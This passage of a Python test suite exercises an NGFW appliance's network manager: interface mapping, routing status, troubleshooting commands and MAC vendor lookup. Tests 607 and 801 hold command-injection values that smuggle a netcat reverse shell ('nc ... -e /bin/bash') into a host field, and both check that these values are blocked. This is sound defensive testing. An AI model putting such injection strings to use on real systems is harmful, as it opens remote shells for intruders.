        # Set settings forces sync-settngs call
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        udev_rules_filename="/etc/udev/rules.d/70-persistent-net.rules"
        with open(udev_rules_filename, "w") as file:
            for device in original_device_mac_mapping:
                file.write(f"SUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{{address}}==\"{original_device_mac_mapping[device]}\", ATTR{{dev_id}}==\"0x0\", ATTR{{type}}==\"1\", KERNEL==\"eth*\", NAME=\"{device}\"\n")

        # Remove the systemd mapping files; we don't want a rename to occur
        systemd_network_path="/etc/systemd/network"
        for filename in os.listdir(systemd_network_path):
            if filename.endswith(".link"):
                os.remove(f"{systemd_network_path}/{filename}")

        # Simulate a system reboot:
        # 1. Swap last two devices with interface mapper
        command=f"/usr/share/untangle/bin/interface-mapping.sh -r {device_candidates[-1]}={device_candidates[-2]}"
        print(command)
        print(subprocess.call(command, shell=True))

        # 2. Gather this modified system mapping, simulating reboot with kernel picking different mac addresses
        modified_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
        print(f"modified_device_mac_mapping={modified_device_mac_mapping}")

        # 3. Restart networking
        command="ifdown -a -v --exclude=lo && ifup -a -v --exclude=lo && /usr/bin/systemctl-wait"
        print(command)
        print(subprocess.call(command, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL))

        # Verify original mapping is NOT preserved
        new_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
        print(f"     new_device_mac_mapping={new_device_mac_mapping}")
        for device in original_device_mac_mapping.keys():
            assert new_device_mac_mapping[device] != original_device_mac_mapping[device], f"{device}: orig and new mac address NOT same"

        # Add the flag and try again
        udev_flag_filename="/usr/share/untangle/conf/interface-mapping-use-udev"
        Path(udev_flag_filename).touch()

        # 4. Restart networking
        command="ifdown -a -v --exclude=lo && ifup -a -v --exclude=lo && /usr/bin/systemctl-wait"
        print(command)
        print(subprocess.call(command, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL))

        # Verify original mapping is preserved
        new_device_mac_mapping = build_device_to_mac_address_map(device_candidates[-2:])
        print(f"     new_device_mac_mapping={new_device_mac_mapping}")
        for device in original_device_mac_mapping.keys():
            assert new_device_mac_mapping[device] == original_device_mac_mapping[device], f"{device}: orig and new mac address same"

        os.remove(udev_rules_filename)
        os.remove(udev_flag_filename)

    def test_500_status_interface_transfer(self):
        """
        Status, interface transfer fields
        """
        first_symbolic_device = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('INTERFACE_TRANSFER', first_symbolic_device)
        except:
            assert False, "could not run command"

        print(f"status={status}")

        # Should be non-empty string with space separated values
        assert status is not None and len(status.split(" ")), "contains status fields"

    def test_501_status_interface_ip_address(self):
        """
        Status, interface IP address fields
        """
        first_symbolic_device = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('INTERFACE_IP_ADDRESSES', first_symbolic_device)
        except:
            assert False, "could not run command"

        print(f"status={status}")

        # Should be non-empty string with space separated values
        assert status is not None and len(status.split(" ")), "contains status fields"

    def test_502_status_interface_arp_table(self):
        """
        Status, interface arp fields
        """
        first_symbolic_device = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('INTERFACE_ARP_TABLE', first_symbolic_device)
        except:
            assert False, "could not run command"

        print(f"status={status}")

        # Should be non-empty string with space separated values
        # Should always be at least one ARP address
        assert status is not None and len(status.split(" ")), "contains status fields"

    def test_503_status_dynamic_routing(self):
        """
        Status, dynamic routing

        Does not actually need to be connected to verify status
        """
        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()

        # Get WAN/LAN addresses
        wan_address = None
        wan_network = None
        wan_prefix = 24
        lan_network = None
        lan_prefix = 24
        for interface in network_settings["interfaces"]["list"]:
            if interface.get("isWan") is True:
                if wan_address is not None:
                    continue
                print("WAN interface status=")
                status = global_functions.uvmContext.networkManager().getInterfaceStatus(interface.get("interfaceId"))
                print(status)
                wan_address = status["v4Address"]
                (wan_network, wan_prefix) = status["v4MaskedAddress"].split("/")
            else:
                if lan_network is None:
                    print("LAN interface status=")
                    status = global_functions.uvmContext.networkManager().getInterfaceStatus(interface.get("interfaceId"))
                    print(status)
                    (lan_network, lan_prefix) = status["v4MaskedAddress"].split("/")

        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
        network_settings["dynamicRoutingSettings"]["enabled"] = True
        network_settings["dynamicRoutingSettings"]["bgpEnabled"] = True
        network_settings["dynamicRoutingSettings"]["bgpRouterAs"] = "12345"
        network_settings["dynamicRoutingSettings"]["bgpRouterId"] = wan_address
        network_settings["dynamicRoutingSettings"]["bgpNetworks"]["list"] = [{
            "area": 0,
            "description": "local",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DynamicRouteNetwork",
            "network": lan_network,
            "prefix": lan_prefix,
            "ruleId": 1
        }]
        network_settings["dynamicRoutingSettings"]["ospfEnabled"] = True
        network_settings["dynamicRoutingSettings"]["ospfNetworks"]["list"] = [{
            "area": 1,
            "description": "net",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DynamicRouteNetwork",
            "network": wan_network,
            "prefix": wan_prefix,
            "ruleId": 1
        }]
        global_functions.uvmContext.networkManager().setNetworkSettings(network_settings)

        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_TABLE', None)
        except:
            assert False, "could not run command"

        print(f"route_status={status}")
        # Empty string is fine
        assert status is not None, "dynamic route table is not None"

        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_BGP', None)
        except:
            assert False, "could not run command"

        print(f"bgp_status={status}")
        # Earlier versions had an error for sed
        assert "sed:" not in status, "dynamic bgp does not contain sed error"
        # BGP should contain something
        assert status is not None and len(status.split(" ")), "dynamic bgp contains status fields"

        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_OSPF', None)
        except:
            assert False, "could not run command"

        print(f"ospf_status={status}")
        # Earlier versions had an error for sed
        assert "sed:" not in status, "dynamic ospf does not contain sed error"
        # Empty string is fine
        assert status is not None, "dynamic route ospf is not None"



    def test_577_bgp_dynamic_routing(self):
        """
        This tests adds remote NGFW as a BGP neighbor
        If successfully connected, the local NGFW's BGP neighbor should show as RemoteNGFW ip address
        """

        if runtests.quick_tests_only:
            raise unittest.SkipTest('Skipping a time consuming test')
        bgp_remote = subprocess.call(["ping","-W","5","-c","1",BGP_REMOTE["serverAddress"]],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        bgp_local = subprocess.call(["ping","-W","5","-c","1",BGP_LOCAL["serverAddress"]],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        if (bgp_remote !=0):
            raise unittest.SkipTest("Remote BGP NGFW Unreachable")
        if (bgp_local !=0):
            raise unittest.SkipTest("Local BGP NGFW Unreachable")
        remote_uvm_context = Uvm().getUvmContext(timeout=240, scheme="https", hostname=BGP_REMOTE["serverAddress"], username="admin", password=BGP_REMOTE["adminPassword"])
        remote_uid = remote_uvm_context.getServerUID()
        local_uid = global_functions.uvmContext.getServerUID()
        assert(remote_uid != local_uid)
        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
        remote_network_settings = remote_uvm_context.networkManager().getNetworkSettings()

        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
        network_settings["dynamicRoutingSettings"]["enabled"] = True
        network_settings["dynamicRoutingSettings"]["bgpEnabled"] = True
        network_settings["dynamicRoutingSettings"]["bgpRouterAs"] = "3456"
        network_settings["dynamicRoutingSettings"]["bgpRouterId"] = "99.99.99.99"
        network_settings["dynamicRoutingSettings"]["bgpNetworks"]["list"] = [{
            "area": 0,
            "description": "local",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DynamicRouteNetwork",
            "network": BGP_REMOTE["networks"],
            "prefix": BGP_REMOTE["lan_prefix"],
            "ruleId": 1
        }]
        network_settings["dynamicRoutingSettings"]["bgpNeighbors"]["list"] = [{
            "as": "6543",
            "description": "remote",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DynamicRouteBgpNeighbor",
            "ipAddress": BGP_REMOTE["serverAddress"],
            "ruleId": 1
        }]
        global_functions.uvmContext.networkManager().setNetworkSettings(network_settings)

        remote_network_settings = remote_uvm_context.networkManager().getNetworkSettings()
        orig_remote_network_settings = copy.deepcopy(remote_network_settings)
        remote_network_settings["dynamicRoutingSettings"]["enabled"] = True
        remote_network_settings["dynamicRoutingSettings"]["bgpEnabled"] = True
        remote_network_settings["dynamicRoutingSettings"]["bgpRouterAs"] = "6543"
        remote_network_settings["dynamicRoutingSettings"]["bgpRouterId"] = "88.88.88.88"
        remote_network_settings["dynamicRoutingSettings"]["bgpNetworks"]["list"] = [{
            "area": 0,
            "description": "local",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DynamicRouteNetwork",
            "network": BGP_LOCAL["networks"],
            "prefix": BGP_LOCAL["lan_prefix"],
            "ruleId": 1
        }]
        remote_network_settings["dynamicRoutingSettings"]["bgpNeighbors"]["list"] = [{
            "as": "3456",
            "description": "remote",
            "enabled": True,
            "javaClass": "com.untangle.uvm.network.DynamicRouteBgpNeighbor",
            "ipAddress": BGP_LOCAL["serverAddress"],
            "ruleId": 1
        }]
        remote_uvm_context.networkManager().setNetworkSettings(remote_network_settings)

        time.sleep(10)
        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_BGP', None)
        except:
            assert False, "could not run command"
        assert( BGP_REMOTE['serverAddress'] in status)
        print(f"bgp_status={status}")
        
        remote_uvm_context.networkManager().setNetworkSettings(orig_remote_network_settings)


    def test_504_status_routing_table(self):
        """
        Status, current route table
        """
        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('ROUTING_TABLE', None)
        except:
            assert False, "could not run command"

        print(f"status={status}")

        # Route table should minimally have default routes in any configuration
        assert "default via" in status, "route table contains default routes"

    def test_505_status_qos(self):
        """
        Status, QOS
        """
        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
        network_settings["qosSettings"]["qosEnabled"] = True
        global_functions.uvmContext.networkManager().setNetworkSettings(network_settings)

        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('QOS', None)
        except:
            assert False, "could not run command"

        status = status.replace("\'", "\"")
        status = json.loads(status)

        print(len(status))
        print(f"status={status}")

        # QOS is an array of objects
        assert len(status) > 0, "qos status non empty"

    def test_506_status_dhcp_leases(self):
        """
        Status, DHCP leases
        """
        status = None
        try:
            status = global_functions.uvmContext.networkManager().getStatus('DHCP_LEASES', None)
        except:
            assert False, "could not run command"

        print(f"status={status}")

        # This can be an empty string
        assert status is not None, "dhcp status is not None"

    def test_600_troubleshooting_connectivity(self):
        """
        Troubleshooting, connectivity
        """
        output = get_troubleshooting_output(command='CONNECTIVITY',arguments={
                "DNS_TEST_HOST": "updates.edge.arista.com", 
                "TCP_TEST_HOST": "updates.edge.arista.com"
            })

        # Don't care about success/failure just that we see the test ran
        assert "Testing DNS" in output, "dns test"
        assert "Testing TCP Connectivity" in output, "tcp connectivity test"

    def test_601_troubleshooting_reachable(self):
        """
        Troubleshooting, reachable
        """
        output = get_troubleshooting_output(command='REACHABLE',arguments={
                "HOST": "8.8.8.8"
            })

        # Don't care about success/failure just that we see the test ran
        assert "ping statistics" in output, "reachable test"

    def test_602_troubleshooting_dns(self):
        """
        Troubleshooting, DNS lookup
        """
        output = get_troubleshooting_output(command='DNS',arguments={
                "HOST": "www.google.com"
            })

        # Don't care about success/failure just that we see the test ran
        assert "has address" in output, "dns test"

    def test_603_troubleshooting_connection(self):
        """
        Troubleshooting, connection
        """
        output = get_troubleshooting_output(command='CONNECTION',arguments={
                "HOST": "www.google.com",
                "HOST_PORT": "80"
            })

        # Don't care about success/failure just that we see the test ran
        assert "(http) open" in output, "connection test"

    def test_604_troubleshooting_path(self):
        """
        Troubleshooting, path.
        """
        output = get_troubleshooting_output(command='PATH',arguments={
                "HOST": "www.google.com",
                "PROTOCOL": "I"
            })

        # Don't care about success/failure just that we see the test ran
        assert "traceroute to" in output, "path test"

    def test_605_troubleshooting_download(self):
        """
        Troublewshooting, download
        """
        output = get_troubleshooting_output(command='DOWNLOAD',arguments={
                "URL": "http://cachefly.cachefly.net/5mb.test"
            })

        # Don't care about success/failure just that we see the test ran
        assert "saved" in output, "dns test"


    def test_607_troubleshooting_connection_reverse_shell(self):
        """
        Test should pass ONLY if get_troubleshooting_output returns specific failure output for an invalid entry.
        """
        output = get_troubleshooting_output(command='CONNECTION', arguments={
            "HOST": "-e /bin/bash www.google.com",
            "HOST_PORT": "80"
        })

        assert output == "runTroubleshooting returned None (likely blocked or errored)", \
            "Expected get_troubleshooting_output to fail, but it succeeded"

    def test_701_remove_dpkg_files(self):
        """
        Removing dpkg files
        """
        dpkg_file_name = '740-test.dpkg-old'
        dir_path = '/etc/untangle/'
        search_string = '*.dpkg-*'
        dir_list = [os.path.abspath(dir.path)+ '/' for dir in os.scandir(dir_path) if dir.is_dir()]
        # listing directories under /etc/untangle/ and
        # creating files with .dkpg- extension
        for dir in dir_list:
           with open(dir + dpkg_file_name, "w") as f:
              f.write("residual file test")

        #.dkpg- extension files are present
        residual_files = find_files(dir_path, search_string)
        assert len(residual_files) > 0

        # Set settings forces sync-settings call
        # Restore original settings to return to initial settings
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
        #sync settings should cleanup .dkpg- extension files
        residual_files = find_files(dir_path, search_string)
        assert len(residual_files) == 0

    def test_702_remove_snort_files(self):
        """
        Removing snort files
        """
        snort_file_name = '740-snort'
        dir_path = '/etc/untangle/iptables-rules.d/'
        search_string = '*-snort*'
        # creating files with *-snort* extension
        with open(dir_path + snort_file_name, "w") as f:
            f.write("snort file test")

        #*-snort* extension files are present
        snort_files = find_files(dir_path, search_string)
        print(snort_files)
        assert len(snort_files) > 0
        # Set settings forces sync-settings call
        # Restore original settings to return to initial settings
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
        #sync settings should cleanup *-snort* extension files
        snort_files = find_files(dir_path, search_string)
        assert len(snort_files) == 0
    
    def test_012_remove_unreachable_host(self):
        """
        Remove unreachable host
        """
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        interfaces = netsettings['interfaces']['list']
        assert (len(interfaces) > 0)
        # Get the first interface name from the settings
        interface_name = interfaces[0]["systemDev"]
        
        # Backup original configuration file and set a new file with updated configuration
        untangle_vm_conf_filename = "/usr/share/untangle/conf/untangle-vm.conf"
        untangle_vm_conf_tmp_filename = f"{untangle_vm_conf_filename}.tmp"
        untangle_vm_conf_original_filename = f"{untangle_vm_conf_filename}.orig"

        shutil.copyfile(untangle_vm_conf_filename, untangle_vm_conf_original_filename)

        host_cleaner_interval = 5000
        host_cleaner_max_unreachable = 60000
        vm_conf = []
        with open(untangle_vm_conf_filename, "r") as file:
            for line in file:
                if line.startswith("host_cleaner_interval="):
                    line = f"host_cleaner_interval=\"{str(host_cleaner_interval)}\"\n"
                if line.startswith("host_cleaner_max_unreachable="):
                    line = f"host_cleaner_max_unreachable=\"{str(host_cleaner_max_unreachable)}\"\n"
                vm_conf.append(line)
            file.close()

        with open(untangle_vm_conf_tmp_filename, "w") as file:
            for line in vm_conf:
                file.write(line)
            file.close()

        os.replace(untangle_vm_conf_tmp_filename, untangle_vm_conf_filename)
        ## Restart uvm
        global_functions.uvmContext = global_functions.restart_uvm()

        # Add a host entry which is not part of the network
        unreachable_entry = {}
        unreachable_entry['usernameDirectoryConnector'] = 'unrechable_host'
        ip_address = global_functions.get_broadcast_address(interface_name)
        #Cover the PPPOE case where broadcast address is recieved as x.x.x.x/xx instead of x.x.x.x
        if "/" in ip_address and ip_address.split("/")[1].isdigit():
        #Broadcast address of pppoe interface is reachable,  modifying last ip segment to 255
            unreachable_entry['address'] = ".".join(ip_address.split("/")[0].split(".")[:-1] + ["255"])
        else:
            unreachable_entry['address'] = ip_address

        global_functions.uvmContext.hostTable().setHostTableEntry( unreachable_entry['address'], unreachable_entry )

        client_entry = {}
        client_entry['address'] = remote_control.client_ip
        client_entry['usernameDirectoryConnector'] = remote_control.run_command("hostname -s", stdout=True)
        global_functions.uvmContext.hostTable().setHostTableEntry( client_entry['address'], client_entry )
        
        # Let the cleanup thread remove the unreachable host
        time.sleep(90)

        # Try to retrieve the host entry
        unreachable_entry = global_functions.uvmContext.hostTable().getHostTableEntry( unreachable_entry['address'] )
        client_entry = global_functions.uvmContext.hostTable().getHostTableEntry( client_entry['address'] )

        ##
        ## Restore orginal untangle-vm.conf
        shutil.copyfile(untangle_vm_conf_original_filename, untangle_vm_conf_filename)
        global_functions.uvmContext = global_functions.restart_uvm()

        assert (unreachable_entry == None)
        assert (client_entry != None)

        # Cleanup
        global_functions.uvmContext.hostTable().removeHostTableEntry( client_entry['address'] )

    def test_705_mac_address_vendor_lookup_list(self):
        """
        Verify we can get vendors for the mac addresses
        """
        deviceStatus = global_functions.uvmContext.networkManager().getDeviceStatus()
        interfaceList = deviceStatus["list"]
        if(len(interfaceList) <= 0): 
            raise unittest.SkipTest('Interface Not Known')
        if(interfaceList[0]["macAddress"] == None):
            raise unittest.SkipTest('MAC Address Not Known')
        mac_address_list = { 'javaClass': 'java.util.LinkedList', 'list': [interfaceList[0]["macAddress"]] }

        # Get vendor for mac Address
        mac_address_vendor_map = global_functions.uvmContext.networkManager().lookupMacVendorList(mac_address_list)
        assert(len(mac_address_vendor_map) > 0)

    def test_706_lookup_vendor_for_mac_address_list(self):
        """
        Verify we can get vendors for the mac addresses.
        """
        # MAC address list in string format
        mac_address_list_string = "f0:35:75:af:2e:72,84:47:09:02:41:e6,00:23:81:52:e4:1e,5c:61:99:42:44:5e,48:25:67:01:e4:e9"

        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(mac_address_list_string)

        # Check if result is None
        self.assertIsNotNone(mac_address_vendor_map, "The result should not be None.")
        self.assertIsInstance(mac_address_vendor_map, list, "The result should be a list.")

        # Verify the output contains expected fields
        for entry in mac_address_vendor_map:
            self.assertIsInstance(entry, dict, "Each entry should be a dictionary.")
            self.assertIn('MAC', entry, "Each entry should contain 'MAC'.")
            self.assertIn('Organization', entry, "Each entry should contain 'Organization'.")

    def test_707_lookup_vendor_for_single_mac_address(self):
        """
        Verify we can get the vendor for a single MAC address.
        """
        # Single MAC address
        mac_address_string = "f0:35:75:af:2e:72"

        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(mac_address_string)

        # Check if result is None
        self.assertIsNotNone(mac_address_vendor_map, "The result should not be None.")
        self.assertIsInstance(mac_address_vendor_map, list, "The result should be a list.")

        # Check that the list has exactly one entry
        self.assertEqual(len(mac_address_vendor_map), 1, "The result should contain exactly one entry.")

        # Verify the single entry in the list contains the expected fields
        entry = mac_address_vendor_map[0]
        self.assertIsInstance(entry, dict, "The entry should be a dictionary.")
        self.assertIn('MAC', entry, "The entry should contain 'MAC'.")
        self.assertIn('Organization', entry, "The entry should contain 'Organization'.")

    def test_708_lookup_vendor_for_empty_mac_address(self):
        """
        Verify behavior for an empty MAC address.
        """
        # Empty MAC address
        empty_mac_address = ""

        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(empty_mac_address)

        # Check if result is None
        self.assertIsNone(mac_address_vendor_map, "The result should be None for an empty MAC address.")
    
    def test_709_lookup_vendor_for_null_mac_address(self):
        """
        Verify behavior for a null MAC address.
        """
        # Null MAC address
        null_mac_address = None

        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(null_mac_address)

        # Check if result is None
        self.assertIsNone(mac_address_vendor_map, "The result should be None for a null MAC address.")

    def test_710_lookup_vendor_for_invalid_mac_address(self):
        """
        Verify behavior for an invalid MAC address.
        """
        # Invalid MAC address
        invalid_mac_address = "0:1A:B:3C:"

        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(invalid_mac_address)

        # Check if the result contains an 'Organization' field with value 'Unknown'
        self.assertEqual(mac_address_vendor_map, [{'Organization': 'Unknown', 'MAC': '0:1A:B:3C:'}],
                        "The result should have an 'Organization' field with value 'Unknown' for an invalid MAC address.")

    def test_720_dnsmasq_source(self):
        """
        Verify that DNS resolver addresses are properly "pinned" to their interfaces
        """
        tcpdump_timeout = 5

        # Public DNS resolvers from https://www.lifewire.com/free-and-public-dns-servers-2626062
        public_dns_resolvers = ["8.8.8.8", "8.8.4.4", "9.9.9.9", "149.112.112.112"]
        dns_addresses = ["www.google.com", "www.microsoft.com", "www.apple.com", "www.facebook.com"]
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()

        # Get enabled WAN interfaces, static, Ethernet
        wan_interfaces = []
        for interface in netsettings["interfaces"]["list"]:
            if interface["isWan"] is not True:
                continue
            if interface.get("configType") == 'DISABLED':
                continue
            if interface.get("v4ConfigType") != 'STATIC':
                continue
            if interface["v4ConfigType"] == "PPPOE":
                continue
            wan_interfaces.append(interface)

        # Don't continue if we have too little, too many interfaces
        if len(wan_interfaces) < 2:
            raise unittest.SkipTest("less than 2 WAN interfaces found")

        if len(wan_interfaces) > len(public_dns_resolvers):
            raise unittest.SkipTest("more WAN interfaces than defined DNS resolvers")

        # Update DNS resolvers from public list
        # maintain map of symbolic dev and the associated public DNS resolver
        dev_resolver_map = {}
        public_dns_resolver_index = 0
        for wan_interface in wan_interfaces:
            wan_interface["v4StaticDns1"] = public_dns_resolvers[public_dns_resolver_index]
            wan_interface["v4StaticDns2"] = ""
            dev_resolver_map[wan_interface["symbolicDev"]] = public_dns_resolvers[public_dns_resolver_index]
            public_dns_resolver_index += 1
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
        print(dev_resolver_map)

        # Creae a forked timeout process to run tcpdump on DNS port.
        output_file_name = f"/tmp/{self.__class__.__name__}_{sys._getframe().f_code.co_name}"
        command=f"rm -f {output_file_name} ; timeout {tcpdump_timeout}s tcpdump -i any -n --direction out port 53 > {output_file_name} &"
        print(f"command={command}")
        subprocess.call(command, shell=True, stderr=sys.stdout.buffer)

        # Perform lookups from client
        for dns_address in dns_addresses:
            remote_control.run_command(f"dig {dns_address}")

        # The lookups will be quick so just do a full wait for the forked process to complete
        time.sleep(tcpdump_timeout)

        # Read tcpdump
        with open(output_file_name, "r") as f:
            lines = f.readlines()
            f.close()

        invalid_dns = False
        # Analyze tcpdump for our WAN interfaces to verify DNS resolvers are going where we expect.
        # In the following example, expecting eth2 to be using 8.8.8.8.
        # 12:25:24.719264 eth2  Out IP arista.domain.com.4028 > 8.8.8.8.domain: 60147+ [1au] A? www.notlikely.com. (58)
        tcpdump_match_re = re.compile('^[^\s]+\s+([^\s]+)\s+Out\s+IP\s+([^\s]+)\s+>\s+([^\:]+).+')
        for line in lines:
            matches = tcpdump_match_re.match(line)
            if matches is not None:
                dev = matches.group(1)
                resolver = matches.group(3)
                resolver = resolver[0:resolver.rfind(".")]
                if dev in dev_resolver_map:
                    print(f"dev={dev}, resolver={resolver}")
                    if dev_resolver_map[dev] != resolver:
                        print(f"found incorrect dns resolver on device")
                        invalid_dns = True

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
        assert invalid_dns is False, "dns resolvers properly pinned to devices"


    def test_800_troubleshooting_trace(self):
        """
        Troubleshooting, trace
        """
        interface = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]

        output = get_troubleshooting_output(command='TRACE',arguments={
                "TIMEOUT": "10",
                "MODE": "BASIC",
                "HOST": "any",
                "INTERFACE": interface,
                "FILENAME": "test.pcap"
            })

        # Don't care about success/failure just that we see the test ran
        assert "tcpdump:" in output, "trace test"

    def test_801_runtroubleshoot_argument_exploit_test(self):
        """
        Verify argument exploit is not possible in runTroubleshooting functionality
        """
        # runTroubleshooting using arguments matching suspicious characters
        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "1&nc 192.168.56.129:3333 -e /bin/bash" })
        time.sleep(3)
        assert(execResult == None)

        # runTroubleshooting using valid arguments
        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "amazon.com" })
        time.sleep(3)
        assert(execResult.getResult() == 0)

    def test_802_runts_CONNECTIVITY_DNS_TEST_HOST_exploit(self):
        """
        Verify CONNECTIVITY command blocks exploit attempts in DNS_TEST_HOST argument.
        """
        args = {
            "DNS_TEST_HOST": "updates.edge.arista.com",
            "TCP_TEST_HOST": "updates.edge.arista.com"
        }
        run_exploit_test("CONNECTIVITY", args, "DNS_TEST_HOST")

    def test_803_runts_CONNECTIVITY_TCP_TEST_HOST_exploit(self):
        """
        Verify CONNECTIVITY command blocks exploit attempts in TCP_TEST_HOST argument.
        """
        args = {
            "DNS_TEST_HOST": "updates.edge.arista.com",
            "TCP_TEST_HOST": "updates.edge.arista.com"
        }
        run_exploit_test("CONNECTIVITY", args, "TCP_TEST_HOST")

    def test_804_runts_CONNECTIVITY_valid(self):
        """
        Verify CONNECTIVITY command works correctly with valid arguments.
        """
        args = {
            "DNS_TEST_HOST": "updates.edge.arista.com",
            "TCP_TEST_HOST": "updates.edge.arista.com"
        }
        run_valid_test("CONNECTIVITY", args)

    def test_805_runts_REACHABLE_HOST_exploit(self):
        """
        Verify REACHABLE command blocks exploit attempts in HOST argument.
        """
        args = {"HOST": "8.8.8.8"}
        run_exploit_test("REACHABLE", args, "HOST")

    def test_806_runts_REACHABLE_valid(self):
        """
        Verify REACHABLE command works correctly with valid arguments.
        """
        args = {"HOST": "8.8.8.8"}
        run_valid_test("REACHABLE", args)

    def test_807_runts_DNS_HOST_exploit(self):
        """
        Verify DNS command blocks exploit attempts in HOST argument.
        """
        args = {"HOST": "www.google.com"}
        run_exploit_test("DNS", args, "HOST")

    def test_808_runts_DNS_valid(self):
        """
        Verify DNS command works correctly with valid arguments.
        """
        args = {"HOST": "www.google.com"}
        run_valid_test("DNS", args)

    def test_809_runts_CONNECTION_HOST_exploit(self):
        """
        Verify CONNECTION command blocks exploit attempts in HOST argument.
        """
        args = {"HOST": "www.google.com", "HOST_PORT": "80"}
        run_exploit_test("CONNECTION", args, "HOST")

    def test_810_runts_CONNECTION_HOST_PORT_exploit(self):
        """
        Verify CONNECTION command blocks exploit attempts in HOST_PORT argument.
        """
        args = {"HOST": "www.google.com", "HOST_PORT": "80"}
        run_exploit_test("CONNECTION", args, "HOST_PORT")

    def test_811_runts_CONNECTION_valid(self):
        """
        Verify CONNECTION command works correctly with valid arguments.
        """
        args = {"HOST": "www.google.com", "HOST_PORT": "80"}
        run_valid_test("CONNECTION", args)

    def test_812_runts_PATH_HOST_exploit(self):
        """
        Verify PATH command blocks exploit attempts in HOST argument.
        """
        args = {"HOST": "www.google.com", "PROTOCOL": "I"}
        run_exploit_test("PATH", args, "HOST")

    def test_813_runts_PATH_PROTOCOL_exploit(self):
        """
        Verify PATH command blocks exploit attempts in PROTOCOL argument.
        """
        args = {"HOST": "www.google.com", "PROTOCOL": "U"}
        run_exploit_test("PATH", args, "PROTOCOL")

    def test_814_runts_PATH_valid(self):
        """
        Verify PATH command works correctly with valid arguments.
        """
        args = {"HOST": "www.google.com", "PROTOCOL": "I"}
        run_valid_test("PATH", args)

    def test_815_runts_DOWNLOAD_URL_exploit(self):
        """
        Verify DOWNLOAD command blocks exploit attempts in URL argument.
        """
        args = {"URL": "http://cachefly.cachefly.net/5mb.test"}
        run_exploit_test("DOWNLOAD", args, "URL")

    def test_816_runts_DOWNLOAD_valid(self):
        """
        Verify DOWNLOAD command works correctly with valid arguments.
        """
        args = {"URL": "http://cachefly.cachefly.net/5mb.test"}
        run_valid_test("DOWNLOAD", args)

    def test_817_runts_TRACE_basic_exploit_each_arg(self):
        """
        Verify TRACE (basic mode) blocks exploit attempts in all string arguments.
        """
        base_args = {
            "TIMEOUT": "10",
            "HOST": "any",
            "INTERFACE": get_iface(),
            "FILENAME": "test.pcap",
            "TRACE_ARGUMENTS": "-n -s 23456",
            "MODE": "basic"
        }
        for arg in ["TIMEOUT", "HOST", "INTERFACE", "FILENAME", "TRACE_ARGUMENTS"]:
            with self.subTest(argument=arg):
                run_exploit_test("TRACE", base_args, arg)

    def test_818_runts_TRACE_basic_valid(self):
        """
        Verify TRACE (basic mode) works correctly with valid arguments.
        """
        base_args = {
            "TIMEOUT": "10",
            "HOST": "any",
            "INTERFACE": get_iface(),
            "FILENAME": "test.pcap",
            "TRACE_ARGUMENTS": "-n -s 23456",
            "MODE": "basic"
        }
        run_valid_test("TRACE", base_args)

    def test_819_runts_TRACE_advanced_exploit_each_arg(self):
        """
        Verify TRACE (advanced mode) blocks exploit attempts in all string arguments.
        """
        base_args = {
            "TIMEOUT": "10",
            "HOST": "any",
            "INTERFACE": get_iface(),
            "FILENAME": "test.pcap",
            "TRACE_ARGUMENTS": "-n -s 23456",
            "MODE": "advanced"
        }
        for arg in ["TIMEOUT", "HOST", "INTERFACE", "FILENAME", "TRACE_ARGUMENTS"]:
            with self.subTest(argument=arg):
                run_exploit_test("TRACE", base_args, arg)

    def test_820_runts_TRACE_advanced_valid(self):
        """
        Verify TRACE (advanced mode) works correctly with valid arguments.
        """
        base_args = {
            "TIMEOUT": "10",
            "HOST": "any",
            "INTERFACE": get_iface(),
            "FILENAME": "test.pcap",
            "TRACE_ARGUMENTS": "-n -s 23456",
            "MODE": "advanced"
        }
        run_valid_test("TRACE", base_args)

    @classmethod
    def final_extra_tear_down(cls):
